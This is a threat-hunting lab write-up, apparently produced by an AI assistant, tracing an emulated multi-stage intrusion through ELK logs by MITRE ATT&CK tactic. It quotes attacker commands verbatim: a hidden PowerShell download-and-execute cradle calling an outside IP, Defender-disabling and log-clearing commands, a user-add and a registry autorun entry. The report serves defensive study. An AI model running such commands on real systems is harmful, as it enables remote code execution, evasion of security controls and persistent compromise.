@@ -1,0 +1,102 @@
+That's an important detail. I've removed the internal links from the table of contents to ensure it's a clean markdown document for you to copy and paste.
+
+Here is the revised write-up in markdown, with no links.
+
+-----
+
+# Cybersecurity Lab Report: My Threat Hunting Experience
+
+## Table of Contents
+
+  * Introduction
+  * Lab Environment and Tools
+  * Threat Hunting Findings
+      * Initial Access (TA0001)
+      * Execution (TA0002)
+      * Defense Evasion (TA0005)
+      * Persistence (TA0003)
+      * Command and Control (TA0011)
+  * Conclusion
+
+-----
+
+### Introduction
+
+This report documents my findings from a series of threat hunting activities I performed on an emulated network using the **Elastic Stack (ELK)**. My goal was to apply threat hunting methodologies to identify and investigate malicious activity across several MITRE ATT\&CK tactics, including **Initial Access**, **Execution**, **Defense Evasion**, **Persistence**, and **Command and Control**. The analysis was based on logs collected on July 3, 2023, providing a detailed look at a multi-stage attack.
+
+-----
+
+### Lab Environment and Tools
+
+For this lab, I worked on the following emulated network, with logs collected in an ELK instance.
+
+| Host | Operating System | Purpose |
+| :--- | :--- | :--- |
+| `JUMPHOST` | Ubuntu 20.04 | A bastion server. |
+| `WEB01` | Ubuntu 20.04 | External-facing web application. |
+| `WKSTN-1` | Windows 10 | Employee workstation. |
+| `WKSTN-2` | Windows 10 | Employee workstation. |
+| `DC01` | Windows Server 2019 | Domain controller. |
+
+I used the following indices in the ELK stack for my analysis:
+
+  * `Filebeat`: For all logs from the Linux servers (`JUMPHOST`, `WEB01`).
+  * `Winlogbeat`: For all events from the Windows machines (`WKSTN-1`, `WKSTN-2`, `DC01`).
+  * `Packetbeat`: To analyze network traffic from all hosts.
+
+-----
+
+### Threat Hunting Findings
+
+The following sections detail my hunting approach and key findings for each targeted MITRE ATT\&CK tactic.
+
+#### Initial Access (TA0001)
+
+My hunt focused on discovering how an adversary first gained a foothold in the network.
+
+  * **SSH Brute-force on `JUMPHOST`**: My analysis of the `filebeat` index showed over 500 failed SSH attempts from IPs `167.71.198.43` and `218.92.0.115`. I later found a successful login by the `dev` user from `167.71.198.43` at **`Jul 3, 2023 @ 07:05:40.407`**.
+  * **Remote Code Execution on `WEB01`**: Using `packetbeat`, I saw a high number of `404` status codes for requests to `WEB01` from `167.71.198.43`. This led to a vulnerable `/gila` endpoint, which was exploited. The attacker's `cat` command revealed a sensitive file named **`config.php`**.
+  * **Phishing Attempts on Workstations**: I discovered suspicious file downloads on `WKSTN-1` (`microsoft.hta`) and `WKSTN-2` (`update.exe`). An `Update.zip` attachment, containing a malicious `.lnk` file, was opened from Outlook and spawned **`cmd.exe`**.
+
+#### Execution (TA0002)
+
+My hunt for Execution was aimed at figuring out how the adversary ran their malicious code.
+
+  * **Malicious Command-line Usage**: I observed a process named `installer.exe`, located in `C:\Windows\Temp`, executing a malicious PowerShell command:
+    ```
+    powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://167.71.198.43:8080/a'))"
+    ```
+  * **LOLBAS Abuse**: Sysmon logs showed me the abuse of Living-Off-the-Land Binaries. I found that `mshta.exe` was used to spawn a PowerShell process that connected to `167.71.198.43`.
+  * **Scripting Tool Execution**: A malicious Python script (`dev.py`) on `WKSTN-2` spawned a `cmd.exe` process that executed the command: **`"net.exe" user /add`**.
+
+#### Defense Evasion (TA0005)
+
+This part of my investigation focused on the adversary's attempts to evade security controls.
+
+  * **Disabling Windows Defender**: I found two attempts to disable Windows Defender. The `Set-MpPreference` command was executed by `installer.exe`, and a separate `MpCmdRun.exe -RemoveDefinitions` command was executed by a `cmd.exe` process with a PID of **`1832`**.
+  * **Log Deletion Attempts**: I found that event logs were cleared on `WKSTN-1` (Sysmon Event ID 1102). The command line used was **`Clear-EventLog -LogName Security,System,Application`**.
+  * **Process Injection**: I detected a suspicious process injection event (Sysmon Event ID 8) on `WKSTN-1` where a malicious `chrome.exe` binary created a new thread in `explorer.exe`. The target PID was **`1404`**.
+
+#### Persistence (TA0003)
+
+To find out how the attacker maintained long-term access, I hunted for persistence mechanisms.
+
+  * **Scheduled Task Creation**: I discovered a malicious scheduled task named "Windows Update" on `WKSTN-1`. The parent process that created this task was **`powershell.exe`**.
+  * **Registry Key Modification**: I found a suspicious registry key modification that set the malicious `installer.exe` binary to run at system startup. The command was:
+    ```
+    "C:\Windows\System32\reg.exe" add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Windows\Temp\installer.exe" /f
+    ```
+
+#### Command and Control (TA0011)
+
+My final hunt focused on how the adversary maintained communication with compromised systems.
+
+  * **C2 over DNS**: I noticed a high volume of unique subdomains for `golge.xyz` from `WKSTN-1`. This was initiated by `nslookup.exe`, which I found was spawned by a PowerShell command that downloaded a script from **`http://www.oneedirve.xyz:8080/a`**.
+  * **C2 over Cloud Apps**: I identified traffic to **`discord.gg`**, which I correlated to the `installer.exe` process. The malicious `dev.py` script was downloaded via a `certutil.exe` command, which showed the use of a third-party cloud application for C2.
+  * **C2 over Encrypted HTTP**: I detected a high count of `HTTP GET` requests to `cdn.golge.xyz` from `WKSTN-1` and `WKSTN-2`. This traffic was initiated by a **`powershell.exe`** process.
+
+-----
+
+### Conclusion
+
+Through these activities, I successfully mapped out a complete multi-stage attack chain within the emulated network. The attacker gained initial access, executed malicious payloads, and used various LOLBAS to download more tools. To remain undetected, they disabled Windows Defender, cleared event logs, and performed process injection. Persistence was established through scheduled tasks and registry modifications. Finally, they maintained communication via several Command and Control channels. My findings demonstrate the importance of continuous threat hunting and correlating events across different log sources to get a full picture of an intrusion.
